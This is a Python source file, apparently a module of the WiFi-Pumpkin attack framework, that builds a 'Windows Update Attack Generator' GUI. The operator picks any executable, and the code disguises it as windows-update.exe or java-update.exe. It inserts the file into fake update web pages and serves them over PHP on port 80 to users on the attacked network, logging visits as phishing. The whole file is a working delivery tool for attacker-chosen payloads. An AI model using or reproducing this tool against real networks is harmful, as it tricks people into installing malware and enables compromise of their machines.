from os import getcwd,popen,chdir,path,remove
from shutil import copyfile
from subprocess import Popen,PIPE,STDOUT
from datetime import date
from Core.loaders.Stealth.PackagesUI import *

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes functionality
    for Fake update windows.

Copyright:
    Copyright (C) 2015 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""
threadloading = {'server':[]}

class frm_update_attack(PumpkinModule):
    def __init__(self, parent=None):
        super(frm_update_attack, self).__init__(parent)
        self.setWindowTitle('Windows Update Attack Generator ')
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.loadtheme(self.configure.XmlThemeSelected())
        self.Main       = QVBoxLayout()
        self.owd        = getcwd()
        self.path_file  = None
        self.GUI()

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            global threadloading
            for i in threadloading['server']:i.stop()
            self.removefiles()
            return
        event.ignore()

    def GUI(self):
        self.form   = QFormLayout(self)
        self.grid   = QGridLayout(self)
        self.grid1  = QGridLayout(self)
        self.path   = QLineEdit(self)
        self.logBox = QListWidget(self)
        self.status = QStatusBar(self)
        self.status.setFixedHeight(15)
        self.path.setFixedHeight(28)
        self.path.setFixedWidth(400)
        #combobox
        self.cb_interface = QComboBox(self)
        self.refresh_interface(self.cb_interface)

        #label
        self.lb_interface = QLabel("Network Adapter:")
        # buttons
        self.btn_open         = QPushButton("...")
        self.btn_stop         = QPushButton("Stop",self)
        self.btn_reload       = QPushButton("refresh",self)
        self.btn_start_server = QPushButton("Start Server",self)
        # size
        self.btn_open.setMaximumWidth(90)
        self.btn_stop.setFixedHeight(50)
        self.btn_start_server.setFixedHeight(50)
        #icons
        self.btn_open.setIcon(QIcon("rsc/open.png"))
        self.btn_stop.setIcon(QIcon("rsc/Stop.png"))
        self.btn_reload.setIcon(QIcon("rsc/refresh.png"))
        self.btn_start_server.setIcon(QIcon("rsc/server.png"))

        # connect buttons
        self.btn_open.clicked.connect(self.getpath)
        self.btn_reload.clicked.connect(self.inter_get)
        self.btn_start_server.clicked.connect(self.server_start)
        self.btn_stop.clicked.connect(self.stop_attack)

        # radionButton
        self.rb_windows = QRadioButton("Windows Update",self)
        self.rb_windows.setIcon(QIcon("rsc/winUp.png"))
        self.rb_adobe = QRadioButton("Adobe Update", self)
        self.rb_adobe.setIcon(QIcon("rsc/adobe.png"))
        self.rb_java = QRadioButton("Java Update", self)
        self.rb_java.setIcon(QIcon("rsc/java.png"))
        self.rb_adobe.setEnabled(False)
        self.grid.addWidget(self.rb_windows, 0,1)
        self.grid.addWidget(self.rb_adobe, 0,2)
        self.grid.addWidget(self.rb_java, 0,3)

        # check interface
        self.grid.addWidget(self.lb_interface,1,1)
        self.grid.addWidget(self.cb_interface,1,2)
        self.grid.addWidget(self.btn_reload, 1,3)

        #grid 2
        self.grid1.addWidget(self.btn_start_server,0,2)
        self.grid1.addWidget(self.btn_stop,0,4)

        #form add layout
        self.form.addRow(self.path,self.btn_open)
        self.form.addRow(self.grid)
        self.form.addRow(self.grid1)
        self.form.addRow(self.logBox)
        self.form.addRow(self.status)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def removefiles(self):
        pathList = ['Templates/Update/Windows_Update/index.html',
                    'Templates/Update/Windows_Update/windows-update.exe',
                    'Templates/Update/Java_Update/index.html',
                    'Templates/Update/Java_Update/java-update.exe']
        for i in pathList:
            if path.isfile(i):remove(i)

    def stop_attack(self):
        for i in threadloading['server']:i.stop()
        threadloading['server'] = []
        self.removefiles()
        self.logBox.clear()
        self.status.showMessage('')

    def inter_get(self):
        self.refresh_interface(self.cb_interface)

    def refresh_interface(self,cb):
        cb.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if n[i] != '':
                cb.addItem(n[i])

    def logPhising(self,log):
        self.logBox.addItem(log)


    def SettingsPage(self,pathPage,directory,filename,info):
        try:
            if path.isfile(directory+filename):
                remove(directory+filename)
            copyfile(self.path_file,directory+filename)
        except OSError,e:
            return QMessageBox.warning(self,'error',e)
        file_html = open(pathPage,'r').read()
        if info:
            settings_html = file_html.replace('KBlenfile',
            str(Refactor.getSize(self.path_file))+'KB')
        else:
            settings_html = file_html.replace('{{Date}}',
            str(date.today().strftime("%A %d. %B %Y")))
        if path.isfile(directory+'index.html'):
            remove(directory+'index.html')
        confFile = open(directory+'index.html','w')
        confFile.write(settings_html)
        confFile.close()
        ip = Refactor.get_Ipaddr(self.cb_interface.currentText())
        if ip == None:
            return QMessageBox.warning(self, 'Ip not found',
            'the ipaddress not found on network adapter seleted.')
        self.threadServer(directory,ip)

    def server_start(self):
        if len(self.path.text()) <= 0:
            return QMessageBox.information(self, 'Path file Error', 'Error in get the file path.')
        else:
            if self.rb_windows.isChecked():
                self.SettingsPage('Templates/Update/Settings_WinUpdate.html',
                'Templates/Update/Windows_Update/','windows-update.exe',True)
            if self.rb_java.isChecked():
                self.SettingsPage('Templates/Update/Settings_java.html',
                'Templates/Update/Java_Update/','java-update.exe',False)

    def threadServer(self,directory,ip):
        try:
            chdir(directory)
        except OSError,e:
            return QMessageBox.warning(self, "error directory",e)
        global threadloading
        self.thphp = ThreadPopen(("php -S %s:80"%(ip)).split())
        self.connect(self.thphp,SIGNAL("Activated ( QString ) "),self.logPhising)
        threadloading['server'].append(self.thphp)
        self.thphp.setObjectName("Server-PHP")
        self.thphp.start()
        self.status.showMessage("::Started >> [HTTP::"+ip+" ::Port 80]")
        while True:
            if self.thphp.process != None:
                chdir(self.owd)
                break

    def getpath(self):
        files_types = "exe (*.exe);;jar (*.jar)"
        file = QFileDialog.getOpenFileName(self, 'Open Executable file','',files_types)
        if len(file) > 0:
            self.path_file = file
            self.path.setText(file)